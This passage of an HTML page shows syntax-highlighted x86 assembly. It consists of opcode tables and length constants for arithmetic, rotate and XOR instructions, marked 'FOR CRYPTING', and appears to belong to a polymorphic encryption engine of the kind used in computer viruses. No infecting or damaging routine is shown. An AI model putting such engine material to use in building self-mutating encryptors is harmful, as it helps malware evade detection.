        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C381H</span><span class="sc0">              </span><span class="sc1">;ADD EBX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0F381H</span><span class="sc0">              </span><span class="sc1">;XOR EBX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0FBBAH</span><span class="sc0">              </span><span class="sc1">;BTC (SKIP 0FH)</span><span class="sc0">
</span><span class="sc5">OP32_IMM</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">OP32_IMM_RELO</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0F8BAH</span><span class="sc0">              </span><span class="sc1">;BTC (SKIP 0FH)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0F081H</span><span class="sc0">              </span><span class="sc1">;XOR</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0E881H</span><span class="sc0">              </span><span class="sc1">;SUB</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C081H</span><span class="sc0">              </span><span class="sc1">;ADD</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C8C1H</span><span class="sc0">              </span><span class="sc1">;ROR X</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C0C1H</span><span class="sc0">              </span><span class="sc1">;ROL X</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4090H</span><span class="sc0">               </span><span class="sc1">;INC (ONE BYTE)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4890H</span><span class="sc0">               </span><span class="sc1">;DEC (ONE BYTE)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C8D1H</span><span class="sc0">              </span><span class="sc1">;ROR 1</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C0D1H</span><span class="sc0">              </span><span class="sc1">;ROL 1</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0D0F7H</span><span class="sc0">              </span><span class="sc1">;NOT</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0D8F7H</span><span class="sc0">              </span><span class="sc1">;NEG</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C80FH</span><span class="sc0">              </span><span class="sc1">;BSWAP (ALWAYS BOTTOM)</span><span class="sc0">
</span><span class="sc5">LEN_OP32_IMM</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">OP32_IMM_RELO</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">OP32_REG</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0BH</span><span class="sc0">             </span><span class="sc1">;OR  (09H)</span><span class="sc0">
</span><span class="sc5">OP32_REG_CHG</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">OP32_REG_CHG_RELO</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">    </span><span class="sc2">33H</span><span class="sc0">             </span><span class="sc1">;XOR (31H)</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">03H</span><span class="sc0">             </span><span class="sc1">;ADD (01H)</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2BH</span><span class="sc0">             </span><span class="sc1">;SUB (29H)</span><span class="sc0">
</span><span class="sc5">LEN_OP32_REG_CHG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">OP32_REG_CHG_RELO</span><span class="sc0">
</span><span class="sc1">;FOR CRYPTING</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">33H</span><span class="sc0">             </span><span class="sc1">;XOR</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2BH</span><span class="sc0">             </span><span class="sc1">;SUB</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">03H</span><span class="sc0">             </span><span class="sc1">;ADD</span><span class="sc0">
</span></div></body>
</html>
